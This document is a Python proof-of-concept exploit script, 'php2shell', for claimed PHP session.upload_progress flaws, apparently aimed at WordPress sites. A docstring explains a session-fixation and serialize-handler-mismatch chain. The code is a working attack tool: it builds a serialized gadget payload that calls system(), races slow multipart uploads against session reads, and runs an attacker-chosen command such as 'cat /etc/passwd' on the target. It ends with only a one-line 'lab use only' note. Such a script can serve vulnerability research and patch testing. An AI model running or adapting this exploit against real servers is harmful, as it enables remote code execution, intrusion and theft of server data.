#!/usr/bin/env python3
"""
php2shell.py — CVE-2026-109618 / CVE-2026-109619 PoC
Pre-auth RCE via PHP session.upload_progress

VULNERABILITY:
  php_session_rfc1867_callback (ext/session/session.c):
  1. Session fixation (CVE-2026-109619): PHPSESSID from POST body bypasses use_only_cookies — attacker controls session ID and file path
  2. Stale zval* (CVE-2026-109618): post_bytes_processed cached from arData, never refreshed across php_session_initialize() — writes to freed memory
  3. Unvalidated input: PHP_SESSION_UPLOAD_PROGRESS value stored unsanitized as session key — serialized objects pass through to session file

EXPLOIT (handler mismatch → object injection):
  1. POST to php_serialize dir: slow upload with PHP_SESSION_UPLOAD_PROGRESS value = "x|O:18:\"WP_Cleanup_Handler\":..." → stored as session key upload_progress_x|<serialized_object> in php_serialize format
  2. GET to php handler dir: session_start() reads session, php handler scans for | (pipe) → splits → php_var_unserialize → object created
  3. Trailing data causes decode FAILURE → PHP_VAR_UNSERIALIZE_DESTROY → __destruct → call_user_func("system", cmd) → RCE

CONDITIONS:
  - session.upload_progress.enabled = On (DEFAULT in all PHP builds)
  - Two dirs with different session.serialize_handler (php_serialize vs php)
  - POP gadget class loaded (plugin, auto_prepend_file, theme)

FIX: Replace zval* with zend_long + php_session_rfc1867_sync_counters()
AFFECTED: PHP 5.4.0 — 8.5.11
FIXED: PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12

USAGE:
  python3 php2shell.py TARGET --check
  python3 php2shell.py TARGET --exploit -c 'id'
  python3 php2shell.py TARGET --exploit -c 'cat /etc/passwd' --gadget-class MyPlugin
"""
from __future__ import annotations

import argparse
import socket
import sys
import threading
import time
import uuid
from urllib.parse import urlparse

VERSION = "10.0.0"
BANNER = r"""
  ██████╗ ██╗  ██╗██████╗ ██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
  ██╔══██╗██║  ██║██╔══██╗╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
  ██████╔╝███████║██████╔╝ █████╔╝███████╗███████║█████╗  ██║     ██║
  ██╔═══╝ ██╔══██║██╔═══╝ ██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║
  ██║     ██║  ██║██║     ███████╗███████║██║  ██║███████╗███████╗███████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
  CVE-2026-109618 / CVE-2026-109619 | session.upload_progress → RCE
"""

GADGET_CLASS = "WP_Cleanup_Handler"


def part(boundary: bytes, name: str, body: bytes,
         filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode("latin-1") + b"\r\n\r\n" + body


def recv_all(s: socket.socket, timeout: float = 15) -> bytes:
    s.settimeout(timeout)
    chunks: list[bytes] = []
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        chunks.append(d)
    return b"".join(chunks)


def parse_resp(resp: bytes) -> tuple[str, bytes, str]:
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else ""
    head_body = resp.split(b"\r\n\r\n", 1)
    body = head_body[1] if len(head_body) > 1 else b""
    php_ver = ""
    for line in head_body[0].decode("latin1", "replace").split("\r\n"):
        if line.lower().startswith("x-powered-by:"):
            php_ver = line.split(":", 1)[1].strip()
    return status, body, php_ver


def gadget_payload(cmd: str, cls: str) -> str:
    return (f'O:{len(cls)}:"{cls}":2:'
            f'{{s:8:"callback";s:6:"system";s:4:"args";'
            f's:{len(cmd)}:"{cmd}";}}')


def do_check(host: str, port: int, write_path: str, read_path: str) -> int:
    print(f"\n  [*] Probing session.upload_progress ...\n")

    for label, path in [("Write (php_serialize)", write_path),
                        ("Read  (php handler)", read_path)]:
        boundary = b"CHECK"
        body = (part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"1") + b"\r\n"
                + part(boundary, "f", b"x", filename="a.txt") + b"\r\n"
                + b"--" + boundary + b"--\r\n")
        head = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary=CHECK\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
        ).encode()
        try:
            s = socket.create_connection((host, port), timeout=10)
            s.sendall(head + body)
            resp = recv_all(s, 10)
            s.close()
            status, _, php_ver = parse_resp(resp)
            line = f"      {label}: {path} → {status[:30]}"
            if php_ver:
                line += f"  [{php_ver}]"
            print(line)
        except Exception as e:
            print(f"      {label}: {path} → ERROR {e}")

    print(f"\n  [*] Requirements:")
    print(f"      session.upload_progress.enabled = On (default)")
    print(f"      Write dir: session.serialize_handler = php_serialize")
    print(f"      Read dir:  session.serialize_handler = php (default)")
    print(f"      POP gadget class loaded (plugin / auto_prepend_file)")
    return 0


def do_exploit(host: str, port: int, write_path: str, read_path: str,
               cmd: str, cls: str, stall: float, workers: int,
               attempts: int) -> int:
    payload = gadget_payload(cmd, cls)
    progress_value = ("x|" + payload).encode()

    print(f"\n  [*] Handler mismatch → object injection → RCE")
    print(f"  [*] Write: {write_path} (php_serialize)")
    print(f"  [*] Read:  {read_path} (php + gadget)")
    print(f"  [*] Gadget: {cls}::__destruct → system({cmd})")
    print(f"  [*] Workers: {workers} | Stall: {stall}s | Attempts: {attempts}")
    print()

    for attempt in range(1, attempts + 1):
        sid = uuid.uuid4().hex
        result: dict = {"resp": b""}

        def writer():
            try:
                boundary = b"P2S"
                pre = (part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
                       + part(boundary, "PHP_SESSION_UPLOAD_PROGRESS",
                              progress_value) + b"\r\n"
                       + part(boundary, "f", b"", filename="a.txt") + b"\r\n")
                file_data = b"A" * 8192
                total = len(pre) + len(file_data) + 200000
                head = (
                    f"POST {write_path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                    f"Cookie: PHPSESSID={sid}\r\n"
                    f"Content-Type: multipart/form-data; boundary=P2S\r\n"
                    f"Content-Length: {total}\r\nConnection: close\r\n\r\n"
                ).encode()
                ws = socket.create_connection((host, port), timeout=30)
                ws.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                ws.sendall(head + pre + file_data)
                time.sleep(stall + 2.0)
                ws.close()
            except Exception:
                pass

        def reader():
            try:
                time.sleep(stall)
                head = (
                    f"GET {read_path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                    f"Cookie: PHPSESSID={sid}\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode()
                rs = socket.create_connection((host, port), timeout=20)
                rs.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                rs.sendall(head)
                result["resp"] = recv_all(rs)
                rs.close()
            except Exception:
                pass

        threads = []
        for _ in range(workers):
            wt = threading.Thread(target=writer, daemon=True)
            wt.start()
            threads.append(wt)

        rt = threading.Thread(target=reader, daemon=True)
        rt.start()
        rt.join(timeout=stall + 20)
        for t in threads:
            t.join(timeout=5)

        status, body, _ = parse_resp(result["resp"])
        if body.strip() not in (b"OK", b"") and len(body) > 10:
            print(f"  [{attempt:2d}] *** RCE ***\n")
            for line in body.decode("latin1", "replace").split("\n"):
                line = line.strip()
                if line and line != "OK":
                    print(f"      {line[:150]}")
            return 0

        print(f"  [{attempt:2d}] {status[:30]} | {len(body)}B")
        time.sleep(0.5)

    print(f"\n  [-] No RCE after {attempts} attempts")
    print(f"      Check: handler mismatch config, gadget class, concurrent workers")
    return 1


def main():
    ap = argparse.ArgumentParser(
        description="php2shell — CVE-2026-109618/619 session.upload_progress → RCE",
        epilog="Authorized defensive-research / lab use only.",
    )
    ap.add_argument("url", nargs="?", default="http://127.0.0.1:8888")
    ap.add_argument("--check", action="store_true",
                    help="probe endpoints and show requirements")
    ap.add_argument("--exploit", action="store_true")
    ap.add_argument("-c", "--command", default="id")
    ap.add_argument("--write-path", default="/wp-content/app/index.php",
                    help="endpoint with php_serialize handler")
    ap.add_argument("--read-path", default="/wp-content/api/index.php",
                    help="endpoint with php handler + gadget class")
    ap.add_argument("--gadget-class", default=GADGET_CLASS,
                    help="POP gadget class with call_user_func in __destruct")
    ap.add_argument("--stall", type=float, default=1.35,
                    help="seconds before reader fires (session write window)")
    ap.add_argument("--workers", type=int, default=1,
                    help="concurrent writer threads")
    ap.add_argument("-n", "--attempts", type=int, default=5)
    args = ap.parse_args()

    print(BANNER)
    print(f"  [*] php2shell v{VERSION}")
    print(f"  [*] Target: {args.url}")

    u = urlparse(args.url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80

    if args.check:
        return do_check(host, port, args.write_path, args.read_path)

    if args.exploit:
        return do_exploit(host, port, args.write_path, args.read_path,
                          args.command, args.gadget_class, args.stall,
                          args.workers, args.attempts)

    ap.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())
